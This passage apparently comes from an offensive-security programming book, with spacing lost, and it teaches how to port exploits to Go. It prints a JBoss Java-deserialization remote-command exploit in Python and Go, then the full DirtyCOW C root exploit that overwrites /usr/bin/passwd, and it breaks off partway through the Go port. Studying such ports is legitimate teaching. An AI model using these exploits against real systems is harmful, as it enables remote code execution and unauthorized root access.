webservice=httplib2.Http(disable_ssl_certificate_validation=True)
URL_ADDR="%s://%s:%s"%('https',HOST,PORT)
else:
webservice=httplib2.Http()
URL_ADDR="%s://%s:%s"%('http',HOST,PORT)
headers={"User-Agent":"JBoss_RCE_POC",❺
"Content-type":"application/x-java-serialized-object--SNIPPEDFOR
BREVITY--",
"Content-length":"%d"%len(body_serObj)
}
resp,content=webservice.request❻(
URL_ADDR+"/invoker/JMXInvokerServlet",
"POST",
body=body_serObj,
headers=headers)
#printprovidedresponse.
print("[i]Responsereceivedfromtarget:%s"%resp)
Listing9-3:ThePythonserializationexploitcode
Let’stakealookatwhatyou’reworkingwithhere.The
functionreceivesahost,port,SSLindicator,andoperating
systemcommandasparameters.Tobuildtheproperrequest,
thefunctionhastocreateapayloadthatrepresentsaserialized
Javaobject.Thisscriptstartsbyhardcodingaseriesofbytes
ontoavariablenamedbody_serObj❶.Thesebyteshavebeen
snippedforbrevity,butnoticetheyarerepresentedinthecode
asastringvalue.Thisisahexadecimalstring,whichyou’ll
needtoconverttoabytearraysothattwocharactersofthe
stringbecomeasinglebyterepresentation.Forexample,
you’llneedtoconvertACtothehexadecimalbyte\xAC.To
accomplishthisconversion,theexploitcodecallsafunction
namedhex2raw3.Detailsofthisfunction’sunderlying
implementationareinconsequential,solongasyouunderstand
what’shappeningtothehexadecimalstring.
Next,thescriptcalculatesthelengthoftheoperating
systemcommand,andthenappendsthelengthandcommand
tothebody_serObjvariable❷.Thescriptcompletesthe
constructionofthepayloadbyappendingadditionaldatathat
representstheremainderofyourJavaserializedobjectina
formatthatJBosscanprocess❸.Oncethepayloadis
constructed,thescriptbuildstheURLandsetsupSSLto
ignoreinvalidcertificates,ifnecessary❹.Itthensetsthe
requiredContent-TypeandContent-LengthHTTPheaders❺and
sendsthemaliciousrequesttothetargetserver❻.
Mostofwhat’spresentedinthisscriptshouldn’tbenewto
you,aswe’vecoveredthemajorityofitinpreviouschapters.
It’snowjustamatterofmakingtheequivalentfunctioncalls
inaGofriendlymanner.Listing9-4showstheGoversionof
theexploit.
funcjboss(hoststring,sslbool,cmdstring)(int,error){
serializedObject,err:=hex.DecodeString("ACED0005737--SNIPPEDFOR
BREVITY--017400")❶
iferr!=nil{
return0,err
}
serializedObject=append(serializedObject,byte(len(cmd)))
serializedObject=append(serializedObject,[]byte(cmd)...)❷
afterBuf,err:=hex.DecodeString("740004657865637571--SNIPPEDFOR
BREVITY--7E003A")❸
iferr!=nil{
return0,err
}
serializedObject=append(serializedObject,afterBuf...)
varclient*http.Client
varurlstring
ifssl{❹
client=&http.Client{
Transport:&http.Transport{
TLSClientConfig:&tls.Config{
InsecureSkipVerify:true,
},
},
}
url=fmt.Sprintf("https://%s/invoker/JMXInvokerServlet",host)
}else{
client=&http.Client{}
url=fmt.Sprintf("http://%s/invoker/JMXInvokerServlet",host)
}
req,err:=http.NewRequest("POST",url,bytes.NewReader(serializedObject))
iferr!=nil{
return0,err
}
req.Header.Set(❺
"User-Agent",
"Mozilla/5.0(WindowsNT6.1;WOW64;Trident/7.0;AS;rv:11.0)like
Gecko")
req.Header.Set(
"Content-Type",
"application/x-java-serialized-object;
class=org.jboss.invocation.MarshalledValue")
resp,err:=client.Do(req)❻
iferr!=nil{
return0,err
}
returnresp.StatusCode,nil
}
Listing9-4:TheGoequivalentoftheoriginalPythonserializationexploit(/ch-
9/jboss/main.go)
Thecodeisnearlyaline-by-linereproductionofthe
Pythonversion.Forthisreason,we’vesettheannotationsto
alignwiththeirPythoncounterparts,soyou’llbeableto
followthechangeswe’vemade.
First,youconstructyourpayloadbydefiningyour
serializedJavaobjectbyteslice❶,hardcodingtheportion
beforeyouroperatingsystemcommand.UnlikethePython
version,whichreliedonuser-definedlogictoconvertyour
hexadecimalstringtoabytearray,theGoversionusesthe
hex.DecodeString()fromtheencoding/hexpackage.Next,you
determinethelengthofyouroperatingsystemcommand,and
thenappenditandthecommanditselftoyourpayload❷.
Youcompletetheconstructionofyourpayloadbydecoding
yourhardcodedhexadecimaltrailerstringontoyourexisting
payload❸.Thecodeforthisisslightlymoreverbosethanthe
Pythonversionbecauseweintentionallyaddedinadditional
errorhandling,butit’salsoabletouseGo’sstandardencoding
packagetoeasilydecodeyourhexadecimalstring.
YouproceedtoinitializeyourHTTPclient❹,configuring
itforSSLcommunicationsifrequested,andthenbuilda
POSTrequest.Priortosendingtherequest,yousetyour
necessaryHTTPheaders❺sothattheJBossserverinterprets
thecontenttypeappropriately.Noticethatyoudon’texplicitly
settheContent-LengthHTTPheader.That’sbecauseGo’shttp
packagedoesthatforyouautomatically.Finally,yousend
yourmaliciousrequestbycallingclient.Do(req)❻.
Forthemostpart,thiscodemakesuseofwhatyou’ve
alreadylearned.Thecodeintroducessmallmodificationssuch
asconfiguringSSLtoignoreinvalidcertificates❹andadding
specificHTTPheaders❺.Perhapstheonenovelelementin
ourcodeistheuseofhex.DecodeString(),whichisaGocore
functionthattranslatesahexadecimalstringtoitsequivalent
byterepresentation.You’dhavetodothismanuallyinPython.
Table9-2showssomeadditional,commonlyencountered
PythonfunctionsorconstructswiththeirGoequivalents.
Thisisnotacomprehensivelistoffunctionalmappings.
Toomanyvariationsandedgecasesexisttocoverallthe
possiblefunctionsrequiredforportingexploits.We’rehopeful
thatthiswillhelpyoutranslateatleastsomeofthemost
commonPythonfunctionstoGo.
Table9-2:CommonPythonFunctionsandTheirGoEquivalents
Python
Go
Notes
hex(x)
fmt.Sprintf("%#x",
x)
Convertsaninteger,x,toa
lowercasehexadecimalstring,
prefixedwith"0x".
ord(c)
rune(c)
Usedtoretrievetheinteger
(int32)valueofasingle
character.Worksforstandard
8-bitstringsormultibyte
Unicode.Notethatruneisa
built-intypeinGoandmakes
workingwithASCIIand
Unicodedatafairlysimple.
chr(i)andunichr(i)
fmt.Sprintf("%+q",
TheinverseofordinPython,
rune(i))
chrandunichrreturnastring
oflength1fortheinteger
input.InGo,youusetherune
typeandcanretrieveitasa
stringbyusingthe%+q
formatsequence.
struct.pack(fmt,v1,
v2,...)
binary.Write(...)
Createsabinary
representationofthedata,
formattedappropriatelyfor
typeandendianness.
struct.unpack(fmt,
string)
binary.Read(...)
Theinverseofstruct.packand
binary.Write.Reads
structuredbinarydataintoa
specifiedformatandtype.
PortinganExploitfromC
Let’sstepawayfromPythonandfocusonC.Cisarguablya
lessreadablelanguagethanPython,yetCsharesmore
similaritieswithGothanPythondoes.Thismakesporting
exploitsfromCeasierthanyoumightthink.Todemonstrate,
we’llbeportingalocalprivilegeescalationexploitforLinux.
Thevulnerability,dubbedDirtyCOW,pertainstoarace
conditionwithintheLinuxkernel’smemorysubsystem.This
flawaffectedmost,ifnotall,commonLinuxandAndroid
distributionsatthetimeofdisclosure.Thevulnerabilityhas
sincebeenpatched,soyou’llneedtotakesomespecific
measurestoreproducetheexamplesthatfollow.Specifically,
you’llneedtoconfigureaLinuxsystemwithavulnerable
kernelversion.Settingthisupisbeyondthescopeofthe
chapter;however,forreference,weusea64-bitUbuntu14.04
LTSdistributionwithkernelversion3.13.1.
Severalvariationsoftheexploitarepubliclyavailable.You
canfindtheoneweintendtoreplicateathttps://www.exploit-
db.com/exploits/40616/.Listing9-5showstheoriginalexploit
code,slightlymodifiedforreadability,initsentirety.
#include
#include
#include
#include
#include
#include
#include
void*map;
intf;
intstop=0;
structstatst;
char*name;
pthread_tpth1,pth2,pth3;
//changeifnopermissionstoread
charsuid_binary[]="/usr/bin/passwd";
unsignedcharsc[]={
0x7f,0x45,0x4c,0x46,0x02,0x01,0x01,0x00,0x00,0x00,0x00,0x00,
--snip--
0x68,0x00,0x56,0x57,0x48,0x89,0xe6,0x0f,0x05
};
unsignedintsc_len=177;
void*madviseThread(void*arg)
{
char*str;
str=(char*)arg;
inti,c=0;
for(i=0;i<1000000&&!stop;i++){
c+=madvise(map,100,MADV_DONTNEED);
}
printf("threadstopped\n");
}
void*procselfmemThread(void*arg)
{
char*str;
str=(char*)arg;
intf=open("/proc/self/mem",O_RDWR);
inti,c=0;
for(i=0;i<1000000&&!stop;i++){
lseek(f,map,SEEK_SET);
c+=write(f,str,sc_len);
}
printf("threadstopped\n");
}
void*waitForWrite(void*arg){
charbuf[sc_len];
for(;;){
FILE*fp=fopen(suid_binary,"rb");
fread(buf,sc_len,1,fp);
if(memcmp(buf,sc,sc_len)==0){
printf("%sisoverwritten\n",suid_binary);
break;
}
fclose(fp);
sleep(1);
}
stop=1;
printf("Poppingrootshell.\n");
printf("Don'tforgettorestore/tmp/bak\n");
system(suid_binary);
}
intmain(intargc,char*argv[]){
char*backup;
printf("DirtyCowrootprivilegeescalation\n");
printf("Backingup%s..to/tmp/bak\n",suid_binary);
asprintf(&backup,"cp%s/tmp/bak",suid_binary);
system(backup);
f=open(suid_binary,O_RDONLY);
fstat(f,&st);
printf("Sizeofbinary:%d\n",st.st_size);
charpayload[st.st_size];
memset(payload,0x90,st.st_size);
memcpy(payload,sc,sc_len+1);
map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
printf("Racing,thismaytakeawhile..\n");
pthread_create(&pth1,NULL,&madviseThread,suid_binary);
pthread_create(&pth2,NULL,&procselfmemThread,payload);
pthread_create(&pth3,NULL,&waitForWrite,NULL);
pthread_join(pth3,NULL);
return0;
}
Listing9-5:TheDirtyCOWprivilegeescalationexploitwrittenintheClanguage
RatherthanexplainingthedetailsoftheCcode’slogic,
let’slookatitgenerally,andthenbreakitintochunksto
compareitlinebylinewiththeGoversion.
Theexploitdefinessomemaliciousshellcode,in
ExecutableandLinkableFormat(ELF),thatgeneratesaLinux
shell.Itexecutesthecodeasaprivilegeduserbycreating
multiplethreadsthatcallvarioussystemfunctionstowriteour
shellcodetomemorylocations.Eventually,theshellcode
exploitsthevulnerabilitybyoverwritingthecontentsofa
binaryexecutablefilethathappenstohavetheSUIDbitset
andbelongstotherootuser.Inthiscase,thatbinaryis
/usr/bin/passwd.Normally,anonrootuserwouldn’tbeableto
overwritethefile.However,becauseoftheDirtyCOW
vulnerability,youachieveprivilegeescalationbecauseyou
canwritearbitrarycontentstothefilewhilepreservingthefile
permissions.
Nowlet’sbreaktheCcodeintoeasilydigestibleportions
andcompareeachsectionwithitsequivalentinGo.Notethat
theGoversionisspecificallytryingtoachievealine-by-line
reproductionoftheCversion.Listing9-6showstheglobal
variablesdefinedorinitializedoutsideourfunctionsinC,
whileListing9-7showstheminGo.
❶void*map;
intf;
❷intstop=0;
structstatst;
char*name;
pthread_tpth1,pth2,pth3;
//changeifnopermissionstoread
❸charsuid_binary[]="/usr/bin/passwd";
❹unsignedcharsc[]={
0x7f,0x45,0x4c,0x46,0x02,0x01,0x01,0x00,0x00,0x00,0x00,0x00,
--snip--
0x68,0x00,0x56,0x57,0x48,0x89,0xe6,0x0f,0x05
};
unsignedintsc_len=177;
Listing9-6:InitializationinC
❶varmappuintptr
❷varsignals=make(chanbool,2)
❸constSuidBinary="/usr/bin/passwd"
❹varsc=[]byte{
0x7f,0x45,0x4c,0x46,0x02,0x01,0x01,0x00,0x00,0x00,0x00,0x00,
--snip--
0x68,0x00,0x56,0x57,0x48,0x89,0xe6,0x0f,0x05,
}
Listing9-7:InitializationinGo
ThetranslationbetweenCandGoisfairlystraightforward.
Thetwocodesections,CandGo,maintainthesame
numberingtodemonstratehowGoachievessimilar
functionalitytotherespectivelinesofCcode.Inbothcases,
youtrackmappedmemorybydefiningauintptrvariable❶.In
Go,youdeclarethevariablenameasmappsince,unlikeC,map
isareservedkeywordinGo.Youtheninitializeavariableto
beusedforsignalingthethreadstostopprocessing❷.Rather
thanuseaninteger,astheCcodedoes,theGoconventionis
insteadtouseabufferedbooleanchannel.Youexplicitly
defineitslengthtobe2sincetherewillbetwoconcurrent
functionsthatyou’llwishtosignal.Next,youdefineastring
toyourSUIDexecutable❸andwrapupyourglobalvariables
byhardcodingyourshellcodeintoaslice❹.Ahandfulof
globalvariableswereomittedintheGocodecomparedtothe
Cversion,whichmeansyou’lldefinethemasneededwithin
theirrespectivecodeblocks.
Next,let’slookatmadvise()andprocselfmem(),thetwoprimary
functionsthatexploittheracecondition.Again,we’llcompare
theCversioninListing9-8withtheGoversioninListing9-9.
void*madviseThread(void*arg)
{
char*str;
str=(char*)arg;
inti,c=0;
for(i=0;i<1000000&&!stop;i++❶){
c+=madvise(map,100,MADV_DONTNEED)❷;
}
printf("threadstopped\n");
}
void*procselfmemThread(void*arg)
{
char*str;
str=(char*)arg;
intf=open("/proc/self/mem",O_RDWR);
inti,c=0;
for(i=0;i<1000000&&!stop;i++❶){
❸lseek(f,map,SEEK_SET);
c+=write(f,str,sc_len)❹;
}
printf("threadstopped\n");
}
Listing9-8:RaceconditionfunctionsinC
funcmadvise(){
fori:=0;i<1000000;i++{
select{